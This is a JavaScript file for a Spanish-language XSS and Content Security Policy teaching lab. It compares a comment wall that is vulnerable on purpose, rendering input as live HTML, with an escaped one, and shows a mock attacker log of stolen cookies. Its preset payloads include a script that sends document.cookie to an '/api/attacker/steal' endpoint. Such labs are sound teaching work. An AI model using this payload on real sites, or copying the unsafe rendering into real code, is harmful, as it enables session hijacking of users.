/**
 * Laboratorio XSS y CSP – Ciberseguridad Aplicada
 */

document.addEventListener('DOMContentLoaded', () => {
  if (!document.cookie.includes('victima_session_id')) {
    document.cookie = 'victima_session_id=SECRET998877; path=/; max-age=86400';
    document.cookie = 'usuario_activo=victima; path=/; max-age=86400';
  }

  initTabs();
  initPresets();
  initInjections();
  initMuros();
  initCspSim();
  initC2();
});

/* ---- TABS ---- */
function initTabs() {
  const tabs = document.querySelectorAll('.tab');
  const contents = document.querySelectorAll('.tab-content');

  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      tabs.forEach(t => t.classList.remove('active'));
      contents.forEach(c => c.classList.remove('active'));
      tab.classList.add('active');
      const target = document.getElementById(tab.dataset.tab);
      if (target) target.classList.add('active');
      if (tab.dataset.tab === 'tab-stored') cargarLogsC2();
    });
  });
}

/* ---- PRESETS ---- */
function initPresets() {
  const input = document.getElementById('input-contenido');

  document.getElementById('preset-cookie')?.addEventListener('click', () => {
    input.value = "<script>fetch('/api/attacker/steal?cookie=' + encodeURIComponent(document.cookie));</script>";
  });

  document.getElementById('preset-alert')?.addEventListener('click', () => {
    input.value = "<script>alert('XSS ejecutado. Cookie: ' + document.cookie);</script>";
  });

  document.getElementById('preset-deface')?.addEventListener('click', () => {
    input.value = '<div style="background:#d63031;color:#fff;padding:10px;border-radius:4px;font-weight:bold;text-align:center;">Sitio comprometido por inyeccion XSS</div>';
  });
}

/* ---- INJECTIONS ---- */
function initInjections() {
  document.getElementById('btn-enviar-vulnerable')?.addEventListener('click', async () => {
    const autor = document.getElementById('input-autor').value.trim() || 'Anonimo';
    const contenido = document.getElementById('input-contenido').value.trim();
    if (!contenido) return alert('Escribe un comentario o selecciona un payload.');

    try {
      await fetch('/api/vulnerable/comentarios', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ autor, contenido })
      });
      cargarMuroVulnerable();
      setTimeout(cargarLogsC2, 1000);
    } catch (e) {
      console.error(e);
    }
  });

  document.getElementById('btn-enviar-mitigado')?.addEventListener('click', async () => {
    const autor = document.getElementById('input-autor').value.trim() || 'Anonimo';
    const contenido = document.getElementById('input-contenido').value.trim();
    if (!contenido) return alert('Escribe un comentario o selecciona un payload.');

    try {
      await fetch('/api/mitigado/comentarios', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ autor, contenido })
      });
      cargarMuroMitigado();
    } catch (e) {
      console.error(e);
    }
  });
}

/* ---- MUROS ---- */
function initMuros() {
  document.getElementById('btn-reset-vulnerable')?.addEventListener('click', async () => {
    await fetch('/api/vulnerable/reset', { method: 'POST' });
    cargarMuroVulnerable();
  });

  document.getElementById('btn-reset-mitigado')?.addEventListener('click', async () => {
    await fetch('/api/mitigado/reset', { method: 'POST' });
    cargarMuroMitigado();
  });

  cargarMuroVulnerable();
  cargarMuroMitigado();
}

async function cargarMuroVulnerable() {
  const container = document.getElementById('muro-vulnerable-container');
  if (!container) return;

  try {
    const res = await fetch('/api/vulnerable/comentarios');
    const comentarios = await res.json();

    container.innerHTML = '';
    if (!comentarios.length) {
      container.innerHTML = '<p class="empty">Sin comentarios.</p>';
      return;
    }

    comentarios.forEach(c => {
      const div = document.createElement('div');
      div.className = 'comment';

      const meta = document.createElement('div');
      meta.className = 'comment-meta';
      meta.innerHTML = `<span class="comment-author">${esc(c.autor)}</span><span>#${c.id}</span>`;

      const body = document.createElement('div');
      body.className = 'comment-body';

      // Vulnerable: ejecutar contenido como HTML/script
      try {
        const range = document.createRange();
        range.selectNode(document.body);
        const fragment = range.createContextualFragment(c.contenido);
        body.appendChild(fragment);
      } catch (e) {
        body.innerHTML = c.contenido;
      }

      div.appendChild(meta);
      div.appendChild(body);
      container.appendChild(div);
    });
  } catch (e) {
    container.innerHTML = `<p class="empty">Error: ${e.message}</p>`;
  }
}

async function cargarMuroMitigado() {
  const container = document.getElementById('muro-mitigado-container');
  if (!container) return;

  try {
    const res = await fetch('/api/mitigado/comentarios');
    const comentarios = await res.json();

    container.innerHTML = '';
    if (!comentarios.length) {
      container.innerHTML = '<p class="empty">Sin comentarios.</p>';
      return;
    }

    comentarios.forEach(c => {
      const div = document.createElement('div');
      div.className = 'comment';

      const meta = document.createElement('div');
      meta.className = 'comment-meta';
      meta.innerHTML = `<span class="comment-author" style="color:var(--safe)">${esc(c.autor)}</span><span>#${c.id}</span>`;

      const body = document.createElement('div');
      body.className = 'comment-body escaped';
      body.textContent = c.contenido;

      div.appendChild(meta);
      div.appendChild(body);
      container.appendChild(div);
    });
  } catch (e) {
    container.innerHTML = `<p class="empty">Error: ${e.message}</p>`;
  }
}

/* ---- CSP SIM ---- */
function initCspSim() {
  const output = document.getElementById('sim-csp-output');

  document.getElementById('btn-sim-sin-csp')?.addEventListener('click', () => {
    if (!output) return;
    output.innerHTML = `
      <div style="color:var(--danger); font-weight:600; margin-bottom:4px;">Sin CSP: script ejecutado</div>
      <div>1. El navegador interpreta la etiqueta &lt;script&gt; y ejecuta fetch().</div>
      <div>2. La cookie de sesion se envia al servidor del atacante.</div>
      <div style="color:var(--danger); font-weight:500; margin-top:4px;">Resultado: cookie robada.</div>
    `;
  });

  document.getElementById('btn-sim-con-csp')?.addEventListener('click', () => {
    if (!output) return;
    output.innerHTML = `
      <div style="color:var(--safe); font-weight:600; margin-bottom:4px;">Con CSP: script bloqueado</div>
      <div style="font-family:var(--mono); font-size:0.82rem; background:#fef0f0; padding:6px 8px; border-radius:4px; color:var(--danger); margin:4px 0;">
        Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self'"
      </div>
      <div style="color:var(--safe); margin-top:4px;">Resultado: el navegador rechazo el script. Cookie protegida.</div>
    `;
  });
}

/* ---- C2 ---- */
function initC2() {
  document.getElementById('btn-refrescar-c2')?.addEventListener('click', cargarLogsC2);

  document.getElementById('btn-limpiar-c2')?.addEventListener('click', async () => {
    await fetch('/api/attacker/logs', { method: 'DELETE' });
    cargarLogsC2();
  });

  setInterval(cargarLogsC2, 5000);
  cargarLogsC2();
}

async function cargarLogsC2() {
  const tbody = document.getElementById('tabla-c2-body');
  if (!tbody) return;

  try {
    const res = await fetch('/api/attacker/logs');
    const logs = await res.json();

    if (!logs.length) {
      tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin registros. Publica el payload en el muro vulnerable para ver resultados.</td></tr>';
      return;
    }

    tbody.innerHTML = '';
    logs.forEach(log => {
      const tr = document.createElement('tr');
      tr.innerHTML = `
        <td>${log.id}</td>
        <td>${new Date(log.fecha).toLocaleTimeString()}</td>
        <td>${esc(log.ip || '127.0.0.1')}</td>
        <td><code>${esc(log.cookie)}</code></td>
      `;
      tbody.appendChild(tr);
    });
  } catch (e) {
    console.error(e);
  }
}

/* ---- UTIL ---- */
function esc(str) {
  if (!str) return '';
  return str.replace(/[&<>"']/g, m => {
    switch (m) {
      case '&': return '&amp;';
      case '<': return '&lt;';
      case '>': return '&gt;';
      case '"': return '&quot;';
      case "'": return '&#39;';
      default: return m;
    }
  });
}
